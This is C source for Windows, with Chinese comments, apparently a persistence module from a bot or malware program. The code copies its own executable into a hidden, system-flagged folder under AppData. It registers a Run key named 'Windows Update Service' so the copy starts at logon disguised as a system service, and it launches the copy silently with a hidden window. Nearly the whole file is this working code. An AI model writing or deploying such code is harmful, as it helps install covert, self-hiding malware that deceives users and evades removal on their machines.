#include "header.h"
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <tchar.h>



// 获取当前模块路径
void get_current_module_path(wchar_t* path, size_t len) {
    GetModuleFileNameW(NULL, path, (DWORD)len);
    path[len - 1] = L'\0';
}

// 获取 AppData\\Local 路径
void get_appdata_path(wchar_t* path, size_t len) {
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        path[len - 1] = L'\0';
    }
    else {
        path[0] = L'\0';
    }
}

// 创建隐藏目录（带调试输出）
int create_hidden_directory(const wchar_t* path) {
    DWORD attr = GetFileAttributesW(path);
    char buf[MAX_PATH];
    UnicodeToAnsi(path, buf, MAX_PATH);
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        bot_log("[+] Directory already exists: %s\n", buf);
        return 0;  // 已存在，无需创建
    }

    if (!CreateDirectoryW(path, NULL)) {
        bot_log("[!] Failed to create directory: %s (Error: %d)\n", buf, GetLastError());
        return -1;
    }

#ifdef FILE_ATTR_HIDDEN
    if (!SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
        bot_log("[!] Failed to set hidden attributes for folder: %s\n", buf);
        return -1;
    }
#endif

    bot_log("[+] Created folder: %s\n", buf);
    return 0;
}

// 复制自身并隐藏
int copy_and_hide_bot() {
    wchar_t appdata[MAX_PATH];
    get_appdata_path(appdata, MAX_PATH);

    wchar_t dest_path[MAX_PATH];
    swprintf(dest_path, MAX_PATH, L"%s%s", appdata, HIDDEN_FOLDER);

    // Step 1: 创建隐藏目录
    if (create_hidden_directory(dest_path) != 0) {
        bot_log("[!] Failed to create hidden directory\n");
        return -1;
    }

    // Step 2: 构造目标路径
    wchar_t final_path[MAX_PATH];
    swprintf(final_path, MAX_PATH, L"%s\\%s", dest_path, TARGET_EXE_NAME);

    char buf[MAX_PATH];

    // Step 3: 获取当前模块路径
    wchar_t current_path[MAX_PATH];
    get_current_module_path(current_path, MAX_PATH);
    UnicodeToAnsi(current_path, buf, MAX_PATH);
    bot_log("[+] Current module path: %s\n", buf);

    // Step 4: 复制自身到隐藏路径
    if (!CopyFileW(current_path, final_path, FALSE)) {// overwrite existing file
        bot_log("[!] Copy failed: %d\n", GetLastError());
        return -1;
    }


    UnicodeToAnsi(final_path, buf, MAX_PATH);
    bot_log("[+] Copied to hidden path: %s\n", buf);


#ifdef FILE_ATTR_HIDDEN
     //Step 5: 设置隐藏属性
    if (!SetFileAttributesW(final_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) 
    {
        bot_log("[!] Failed to set hidden attributes for file\n");
    }
    else {
        bot_log("[+] File attributes set to HIDDEN | SYSTEM\n");
    }
#endif

    // Step 6: 添加注册表自启动项
    if (set_registry_persistence(final_path) != 0) {
        bot_log("[!] Failed to set registry persistence\n");
    }
    else {
        bot_log("[+] Registry persistence set\n");
    }

    // Step 7: 启动副本
    SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
    sei.lpVerb = L"open";
    sei.lpFile = final_path;
    sei.nShow = SW_HIDE;


    if (!ShellExecuteExW(&sei)) {
        bot_log("[!] Failed to launch hidden instance (Error: %d)\n", GetLastError());
        return -1;
    }

    bot_log("[+] Hidden instance launched successfully\n");


    return 0;
}

// 注册表添加自启动
int set_registry_persistence(const wchar_t* bot_path) {
    HKEY hKey;
    LONG res = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    if (res != ERROR_SUCCESS) {
        bot_log("[!] Failed to open Run key\n");
        return -1;
    }

    res = RegSetValueExW(hKey, L"Windows Update Service", 0, REG_SZ, (BYTE*)bot_path, (wcslen(bot_path) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);

    if (res != ERROR_SUCCESS) {
        bot_log("[!] Failed to write registry key\n");
        return -1;
    }

    return 0;
}

// 检查自己是否已经是隐藏副本
int is_hidden_bot() {
    wchar_t current_path[MAX_PATH];
    get_current_module_path(current_path, MAX_PATH);

    wchar_t appdata[MAX_PATH];
    get_appdata_path(appdata, MAX_PATH);

    wchar_t expected_path[MAX_PATH];
    swprintf(expected_path, MAX_PATH, L"%s%s\\%s", appdata, HIDDEN_FOLDER, TARGET_EXE_NAME);

    char buf[MAX_PATH];
    UnicodeToAnsi(expected_path, buf, sizeof(buf));
    bot_log("[DEBUG] Expected path: %s\n", buf);
    UnicodeToAnsi(current_path, buf, sizeof(buf));
    bot_log("[DEBUG] Current path: %s\n", buf);

    if (wcsstr(current_path, expected_path) != NULL) {
        bot_log("[+] Already running as hidden bot");
        return 1;  // 已经是隐藏副本
    }

    bot_log("[-] Not running as hidden bot");
    return 0;  // 不是隐藏副本
}